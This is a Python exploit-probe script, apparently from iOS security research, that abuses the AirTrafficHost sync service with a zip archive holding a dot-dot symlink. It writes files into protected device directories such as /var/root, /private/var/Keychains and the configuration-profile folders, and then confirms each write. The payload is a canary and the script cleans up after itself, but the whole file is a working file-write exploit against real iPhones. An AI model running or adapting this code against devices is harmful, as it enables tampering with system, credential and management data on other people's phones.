#!/usr/bin/env python3
"""Probe component-normalization variants of the iOS ATC symlink primitive."""

from __future__ import annotations

import argparse
import hashlib
import io
import json
import os
import plistlib
import posixpath
import secrets
import stat
import tempfile
import zipfile
from pathlib import Path
from typing import Any

import nested_symlink_probe as base


ATC_HOST = Path(__file__).resolve().parent / "atc_host"


TARGETS = (
    (
        "control-preferences-dot-caches",
        "/var/mobile/Library/Preferences/../Caches",
        "/var/mobile/Library/Caches",
    ),
    (
        "configuration-profiles-via-preferences",
        "/var/mobile/Library/Preferences/../ConfigurationProfiles",
        "/var/mobile/Library/ConfigurationProfiles",
    ),
    (
        "user-configuration-profiles-via-preferences",
        "/var/mobile/Library/Preferences/../UserConfigurationProfiles/PublicInfo",
        "/var/mobile/Library/UserConfigurationProfiles/PublicInfo",
    ),
    (
        "managed-preferences-via-preferences",
        "/var/mobile/Library/Preferences/../Managed Preferences/mobile",
        "/var/mobile/Library/Managed Preferences/mobile",
    ),
    ("var-db-via-mobile", "/var/mobile/../db", "/var/db"),
    ("var-db-via-tmp", "/var/tmp/../db", "/var/db"),
    ("var-root-via-mobile", "/var/mobile/../root", "/var/root"),
    (
        "system-data-via-mobile",
        "/var/mobile/../containers/Data/System",
        "/var/containers/Data/System",
    ),
    (
        "mobilegestalt-group-via-mobile",
        "/var/mobile/../containers/Shared/SystemGroup/"
        "systemgroup.com.apple.mobilegestaltcache/Library/Caches",
        "/var/containers/Shared/SystemGroup/"
        "systemgroup.com.apple.mobilegestaltcache/Library/Caches",
    ),
    (
        "library-preferences-via-mobile",
        "/var/mobile/../../Library/Preferences",
        "/Library/Preferences",
    ),
    (
        "private-keychains-via-mobile",
        "/var/mobile/../../private/var/Keychains",
        "/private/var/Keychains",
    ),
)


def build_archive(
    lexical_directory: str, canonical_directory: str, payload: bytes
) -> tuple[bytes, str]:
    lexical_tail = lexical_directory[1:]
    canonical_tail = base.safe_tail(canonical_directory)
    if not lexical_directory.startswith("/") or lexical_directory.endswith("/"):
        raise ValueError("lexical path must be an absolute directory path")
    components = lexical_tail.split("/")
    if any(component in ("", ".") for component in components):
        raise ValueError("unsafe lexical component")
    contained = posixpath.normpath(f"/source/{lexical_tail}")
    expected_contained = f"/source/{canonical_tail}"
    if contained != expected_contained:
        raise ValueError(
            f"lexical containment mismatch: {contained!r} != {expected_contained!r}"
        )
    if posixpath.normpath(lexical_directory) != canonical_directory:
        raise ValueError("canonical target mismatch")

    metadata = plistlib.dumps(
        {"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True
    )
    output = io.BytesIO()
    seen: set[str] = set()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(base.zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            base.zip_info(
                "META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600
            ),
            metadata,
        )
        for directory in ("p0/", "p0/p1/", "p0/p1/p2/"):
            archive.writestr(base.zip_info(directory, stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            base.zip_info("p0/p1/p2/link", stat.S_IFLNK | 0o777),
            f"../../../{lexical_tail}".encode(),
        )
        base.add_directories(archive, canonical_tail, seen)
        archive.writestr(base.zip_info("payload", stat.S_IFREG | 0o600), payload)
    return output.getvalue(), canonical_tail


def probe_state(
    udid: str,
    source: str,
    link: str,
    recovered: str,
    sentinel: str,
    pivot_leaf: str,
) -> dict[str, Any]:
    return base.mobile(
        udid,
        "probe-nested-state",
        source,
        link,
        recovered,
        sentinel,
        pivot_leaf,
    )


def legacy_three_asset_atc(
    udid: str,
    link_identifier: str,
    link_destination: str,
    payload_identifier: str,
    payload_destination: str,
    recovery_identifier: str,
    recovery_destination: str,
) -> dict[str, Any]:
    return base.run_json(
        [
            os.fspath(ATC_HOST),
            udid,
            link_identifier,
            link_destination,
            payload_identifier,
            payload_destination,
            recovery_identifier,
            recovery_destination,
        ],
        timeout=120,
    )


def run_target(
    udid: str,
    label: str,
    lexical_directory: str,
    canonical_directory: str,
) -> dict[str, Any]:
    token = secrets.token_hex(10)
    source = f"codex-dir-src-24A435-{token}"
    link = f"codex-dir-link-24A435-{token}"
    recovered = f"codex-dir-recovered-24A435-dot-{token}"
    sentinel = f"codex-dir-recovered-24A435-sentinel-{token}"
    pivot_leaf = f"codex-dir-pivot-24A435-{token}"
    target_leaf = f"com.codex.dot-alias-canary-{secrets.token_hex(16)}.bin"
    payload = (
        f"codex iOS dot-alias canary\nbuild=24A435\nlabel={label}\n"
        f"nonce={secrets.token_hex(24)}\n"
    ).encode()
    archive, canonical_tail = build_archive(
        lexical_directory, canonical_directory, payload
    )

    link_identifier = f"../../{source}/p0/p1/p2/link"
    payload_identifier = f"../../{source}/payload"
    target_path = f"{canonical_directory.rstrip('/')}/{target_leaf}"
    target_identifier = posixpath.relpath(target_path, base.AIRLOCK_BOOK_ROOT)
    books = base.build_books(
        [link_identifier, payload_identifier, target_identifier]
    )
    result: dict[str, Any] = {
        "label": label,
        "lexicalDirectory": lexical_directory,
        "canonicalDirectory": canonical_directory,
        "targetLeaf": target_leaf,
        "archiveSHA256": hashlib.sha256(archive).hexdigest(),
        "booksSHA256": hashlib.sha256(books).hexdigest(),
        "payloadSHA256": hashlib.sha256(payload).hexdigest(),
        "existingFilesTargeted": False,
        "canonicalMobileGestaltCacheTouched": False,
    }

    with tempfile.TemporaryDirectory(prefix="atc-dot-alias-ios-") as work_dir:
        work = Path(work_dir)
        archive_path = work / "payload.zip"
        books_path = work / "Books.plist"
        recovery_path = work / "Recovery.plist"
        expected_path = work / "expected.bin"
        archive_path.write_bytes(archive)
        books_path.write_bytes(books)
        expected_path.write_bytes(payload)

        result["preflight"] = base.mobile(udid, "probe-afc")
        if not base.operation_ok(result["preflight"]) or result["preflight"][
            "operation"
        ].get("booksSyncPlistPresent"):
            result["outcome"] = "preflight-failed"
            return result
        result["stage"] = base.mobile(
            udid,
            "stage",
            source,
            link,
            recovered,
            os.fspath(archive_path),
            os.fspath(books_path),
        )
        if not base.operation_ok(result["stage"]):
            result["outcome"] = "stage-failed"
            return result

        result["atc"] = legacy_three_asset_atc(
            udid,
            link_identifier,
            link,
            payload_identifier,
            f"{link}/{target_leaf}",
            target_identifier,
            recovered,
        )
        result["postSequence"] = probe_state(
            udid, source, link, recovered, sentinel, pivot_leaf
        )
        if not result["postSequence"].get("operation", {}).get(
            "recoveredPayloadPresent"
        ):
            recovery_path.write_bytes(base.build_books([target_identifier]))
            result["recoveryStage"] = base.mobile(
                udid,
                "stage-nested-recovery-books",
                source,
                link,
                sentinel,
                os.fspath(recovery_path),
                pivot_leaf,
            )
            if base.operation_ok(result["recoveryStage"]):
                result["recoveryATC"] = base.atc(
                    udid, [(target_identifier, recovered)]
                )

        result["cleanup"] = base.mobile(
            udid,
            "verify-matrix-cleanup",
            source,
            link,
            recovered,
            os.fspath(expected_path),
            canonical_tail,
        )
        result["finalPreflight"] = base.mobile(udid, "probe-afc")
        cleanup = result["cleanup"].get("operation", {})
        result["writeAndExactRecoveryConfirmed"] = bool(
            cleanup.get("recoveredPresent") and cleanup.get("recoveredBytesMatch")
        )
        result["residueAccountedFor"] = bool(
            cleanup.get("safeArguments")
            and cleanup.get("cleanupFailureCount") == 0
            and cleanup.get("sourceMediaAbsent")
            and cleanup.get("linkAbsent")
            and cleanup.get("recoveredAbsent")
            and cleanup.get("booksFilesAbsent")
            and not result["finalPreflight"].get("operation", {}).get(
                "booksSyncPlistPresent"
            )
        )
        result["outcome"] = (
            "write-and-exact-recovery-confirmed"
            if result["writeAndExactRecoveryConfirmed"]
            else "no-write-observed"
        )
    return result


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--udid", required=True)
    parser.add_argument("--label", action="append")
    args = parser.parse_args()
    selected = set(args.label or [label for label, _, _ in TARGETS])
    unknown = selected.difference(label for label, _, _ in TARGETS)
    if unknown:
        parser.error(f"unknown labels: {', '.join(sorted(unknown))}")

    rows: list[dict[str, Any]] = []
    chosen = [row for row in TARGETS if row[0] in selected]
    for index, (label, lexical, canonical) in enumerate(chosen, 1):
        row = run_target(args.udid, label, lexical, canonical)
        rows.append(row)
        print(
            json.dumps(
                {
                    "progress": f"{index}/{len(chosen)}",
                    "label": label,
                    "lexicalDirectory": lexical,
                    "canonicalDirectory": canonical,
                    "outcome": row.get("outcome"),
                    "residueAccountedFor": row.get("residueAccountedFor"),
                },
                sort_keys=True,
            ),
            flush=True,
        )
        if not row.get("residueAccountedFor"):
            break
    summary = {
        "schema": 1,
        "test": "ATCStreamingZipDotAliasIOSDirectoryProbe",
        "expectedProduct": base.EXPECTED_PRODUCT,
        "expectedVersion": base.EXPECTED_VERSION,
        "expectedBuild": base.EXPECTED_BUILD,
        "transport": "paired localNetwork via native MobileDevice/AirTrafficHost",
        "existingFilesTargeted": False,
        "canonicalMobileGestaltCacheTouched": False,
        "targets": rows,
        "confirmedWriteDirectories": [
            row["canonicalDirectory"]
            for row in rows
            if row.get("writeAndExactRecoveryConfirmed")
        ],
        "noWriteObservedDirectories": [
            row["canonicalDirectory"]
            for row in rows
            if row.get("outcome") == "no-write-observed"
        ],
        "allGeneratedArtifactsAccountedFor": bool(
            rows and all(row.get("residueAccountedFor") for row in rows)
        ),
    }
    summary["ok"] = summary["allGeneratedArtifactsAccountedFor"]
    print(json.dumps(summary, sort_keys=True))
    return 0 if summary["ok"] else 2


if __name__ == "__main__":
    raise SystemExit(main())
